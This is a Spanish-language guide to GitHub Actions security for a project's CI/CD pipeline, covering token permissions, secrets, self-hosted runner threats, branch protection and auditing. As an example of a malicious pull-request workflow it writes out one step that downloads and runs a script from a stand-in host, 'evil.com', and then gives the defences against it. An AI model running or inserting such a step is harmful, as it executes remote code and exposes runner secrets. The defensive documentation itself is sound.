# 05 — Seguridad en GitHub Actions

## Principios

1. **Mínimo privilegio**: Cada workflow, job y step solo tiene los permisos mínimos necesarios.
2. **Separación de responsabilidades**: CI y CD tienen permisos completamente diferentes.
3. **Secrets nunca en código**: Todos los sensibles van en GitHub Secrets, nunca en el repositorio.
4. **Runner aislado**: El self-hosted runner está en un LXC dedicado, no en producción.
5. **Defense in depth**: Múltiples capas de protección, no una sola.

## Permisos del GITHUB_TOKEN

### CI Workflow

```yaml
permissions:
  contents: read
```

Solo lectura del código. No puede:
- Escribir al repositorio.
- Crear o modificar releases.
- Acceder a environments.
- Ejecutar workflows.

### CD Workflow

```yaml
permissions:
  contents: read
```

Mismo permiso mínimo. El CD no necesita escribir nada en GitHub. La interacción con el servidor es vía SSH, no vía API de GitHub.

### Rollback Workflow

```yaml
permissions:
  contents: read
```

Solo necesita leer el código para hacer checkout a un commit específico.

## Secrets

### Qué son los secrets

Los secrets son valores encriptados que GitHub almacena y solo expone a workflows autorizados. Nunca se escriben en logs, commits o artifacts.

### Secrets del proyecto

| Secret | Lado | Propósito | Rotación |
|---|---|---|---|
| `DEPLOY_SSH_KEY` | Server | Private key SSH para autenticación | Cada 90 días |
| `DEPLOY_HOST` | Server | IP del LXC 112 | Solo si cambia |
| `DEPLOY_USER` | Server | Usuario SSH | Solo si cambia |

### Cómo se configuran

1. Ir a Settings > Secrets and variables > Actions.
2. Hacer clic en "New repository secret".
3. Introducir nombre y valor.
4. Guardar.

### Restricciones de secrets

- Los secrets **no están disponibles** en workflows de pull requests de forks.
- Los secrets **no se pasan** a steps de `run` que usen `echo`.
- Los secrets **se enmascaran** automáticamente en logs si aparecen.
- Los secrets **no se pueden descargar** como artifacts.

### Variables

| Variable | Environment | Propósito |
|---|---|---|
| `APP_PATH` | production | Ruta de la app en el servidor |

Las variables son strings no encriptados. Se usan para valores no sensibles como rutas.

## Riesgos del Self-Hosted Runner

### El problema fundamental

Un self-hosted runner ejecuta código en **tu servidor**. Si un workflow ejecuta código malicioso, tiene acceso a todo lo que el runner pueda acessar.

### Vectores de ataque

#### 1. Workflow malicioso en un PR

Un contribuidor abre un PR con un workflow que ejecuta código malicioso:

```yaml
# Ejemplo de workflow malicioso (NO hacer esto)
- run: curl http://evil.com/steal.sh | bash
```

**Mitigación**:
- Los PRs de forks no tienen acceso a secrets.
- Los PRs no ejecutan workflows de CD.
- La branch protection requiere aprobación de un reviewer.
- El workflow de CI solo usa `ubuntu-latest` (no el self-hosted runner).

#### 2. Compromiso del repositorio

Alguien obtiene acceso de escritura al repo y modifica los workflows:

**Mitigación**:
- Branch protection: solo administrators pueden modificar `main`.
- Los workflows requieren aprobación de reviewers.
- `GITHUB_TOKEN` tiene permisos mínimos (`contents: read`).
- Auditoría de cambios en `.github/workflows/`.

#### 3. Compromiso del runner

Alguien obtiene acceso al LXC del runner:

**Mitigación**:
- El runner está en un LXC dedicado, aislado de producción.
- El runner usa un usuario sin privilegios (`github-runner`).
- El runner solo puede SSH al LXC 112 como usuario `deploy`.
- El usuario `deploy` tiene sudoers configurado con comandos específicos.
- No hay Docker en el runner (reduce superficie de ataque).

#### 4. Persistencia entre workflows

Un workflow malicioso modifica el runner para afectar workflows futuros:

**Mitigación**:
- El workspace del runner se limpia después de cada job.
- El runner no tiene acceso a `/etc` ni a configuración del sistema.
- El usuario `github-runner` no tiene sudo.
- Si se sospecha compromiso, se revoca y reemplaza el runner (ver sección de recuperación).

## Protección de Branches

### Configuración recomendada

```
Settings > Branches > Branch protection rules > main

✅ Require a pull request before merging
  ✅ Require approvals: 1
  ✅ Dismiss stale pull request approvals when new commits are pushed

✅ Require status checks to pass before merging
  Required checks:
    - ci/backend-lint
    - ci/backend-typecheck
    - ci/backend-test
    - ci/backend-build
    - ci/frontend-typecheck
    - ci/frontend-build
    - ci/ci-summary

✅ Require branches to be up to date before merging

✅ Do not allow bypassing the above settings

✅ Restrict who can push to matching branches
  → Solo el usuario administrador
```

### Por qué cada opción

- **Require PR**: Evita pushes directos a main que bypassen CI.
- **Require approvals**: Alguien revisa el código antes de merge.
- **Dismiss stale approvals**: Si se hace push con cambios nuevos, las aprobaciones previas se invalidan.
- **Require status checks**: Bloquea merge si CI falla.
- **Require up to date**: Asegura que el PR tiene los últimos cambios de main.
- **Do not allow bypassing**: Ni siquiera los admins pueden saltarse los checks.
- **Restrict push**: Solo el admin puede hacer push directo (para emergencias).

## Workflow Permissions en GitHub

### Configuración general

```
Settings > Actions > General

Workflow permissions:
  ✅ Read repository contents and packages permissions

Allow GitHub Actions to create and approve pull requests:
  ❌ Desactivado
```

**Por qué "Read" y no "Read and Write"**: Los workflows no necesitan crear commits, tags ni releases. Si algún workflow intenta escribir, fallará por permisos.

## Riesgos Específicos de E2E en CI

Los tests e2e del proyecto crean y eliminan datos reales. Si se ejecutaran en CI contra una BD de staging:

1. Tests paralelos podrían interferir entre sí.
2. Un test que falle a medio camino deja datos residuales.
3. Los tests no son idempotentes (crean usuarios con emails aleatorios).

**Recomendación**: Los e2e se ejecutan localmente o contra una instancia dedicada de staging, nunca como parte del CI pipeline automático.

## Auditoría

### Qué auditar

- Changes en `.github/workflows/`: Cada modificación debe pasar por PR.
- Secrets usage: GitHub muestra qué workflows usaron qué secrets.
- Runner activity: Los logs del runner muestran cada job ejecutado.
- Deploy logs: `scripts/deploy.sh` genera logs en `/opt/gestor-suscripciones-backups/`.

### Cómo auditar

- **GitHub**: Settings > Actions > Logs — ver todos los workflows ejecutados.
- **Runner**: `journalctl -u github-runner --since "1 week ago"` — ver activity del runner.
- **Servidor**: `ls -la /opt/gestor-suscripciones-backups/deploy_*.log` — ver logs de deploy.

## Flujo de Seguridad Completo

```
Developer hace push a feature branch
    │
    ▼
PR creado → CI se ejecuta (ubuntu-latest, sin secrets)
    │
    ▼
Reviewer aprueba → CI pasa → Merge a main
    │
    ▼
CD se ejecuta (self-hosted runner, con secrets)
    │
    ├── Valida secrets
    ├── Setup SSH (key temporal)
    ├── Ejecuta deploy.sh en LXC 112
    ├── Health check
    └── Limpia SSH key
    │
    ▼
App desplegada en producción
```

En ningún punto el código de un PR tiene acceso a:
- Los secrets de deploy.
- El self-hosted runner.
- El LXC 112 de producción.
